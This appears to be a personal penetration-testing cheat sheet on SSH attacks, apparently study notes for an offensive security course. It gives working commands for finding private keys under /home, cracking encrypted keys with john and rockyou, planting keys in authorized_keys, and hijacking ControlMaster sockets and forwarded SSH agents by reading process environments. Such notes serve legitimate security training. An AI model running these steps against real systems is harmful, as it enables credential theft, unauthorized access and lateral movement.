---
layout:     post
author:     0x5c4r3
type: docs
permalink: SSH
---


<span style="font-size: 35px; color:red"><b>SSH</b></span>

Look for unprotected SSH Keys:
```shell
find /home/ -name "id_rsa"
```

Once find, <span style="color:red">cat id_rsa</span> to see if it's encrypted. The "DEK-Info" declare the type of encryption used.
If encrypted, use <span style="color:red">SSH2JOHN</span> to transform it into hash and crack it with john/hashcat:
```shell
sudo john --wordlist=/usr/share/wordlists/rockyou.txt ./id_rsa.hash
```
If cracked, add your id_rsa to the authoryzed_keys after you get the SSH shell.

Also, check <span style="color:red">~/.bash_history</span> or <span style="color:red">~/.ssh/known_hosts</span> to see who connected recently (might be hashed, if so, nothing to do here).
&nbsp;

---
&nbsp;
<span style="font-size: 30px; color:white"><b>SSH Hijacking</b></span>

<span style="font-size: 25px; color:white"><b>With ControlMaster</b></span>
Use an existing ssh session using ControlMaster (functionality that allows a user to open multiple sessions).
Check <span style="color:red">~/.ssh/controlmaster/</span> to see if there's any socket in the form of <span style="color:red">user@domain:22</span>
If so, you can use it like:
```shell
ssh -S /home/user/.ssh/controlmaster/user\@domain\:22 user@domain
```
no password required!
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>With SSH-Agent</b></span>

SSH-Agent is a utility that keeps track of a user's private keys and allows them to be used without having to repeat their passphrases on every connection.
<span style="color:red">Client --> Intermediate Host --> Final Host</span>

Both Intermediate and Final Host need to have the same public key (<span style="color:red">ssh-copy-id -i ~/.ssh/id_rsa.pub user@domain</span> for both domains). 
- <span style="color:red">ForwardAgent yes</span> on <span style="color:red">~/.ssh/config</span>.
- <span style="color:red">AllowAgentForwarding yes</span> on <span style="color:red">/etc/ssh/sshd_config</span>.
- Start SSH_Agent: _eval <span style="color:red">ssh-agent</span>
- Add key to SSH-Agent: <span style="color:red">ssh-add</span>
Done, you can now connect to Intermediate Host and then from there to Final Host.

&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Exploitation</b></span>
If there's a connection to the <span style="color:red">Intermediate Host</span>, then it's exploitable (check with <span style="color:red">ps aux | grep ssh</span>).
To get ID (PID) value for the SSH processes: <span style="color:red">pstree -p offsec | grep ssh</span>. (just chose one of them).
Cat the process out to find the <span style="color:red">SSH_AUTH_SOCK</span> variable: 
```shell
cat /proc/<PID>/environ
```
Then <span style="color:red">SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380 ssh-add -l</span> and <span style="color:red">SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380 ssh offsec@linuxvictim</span>

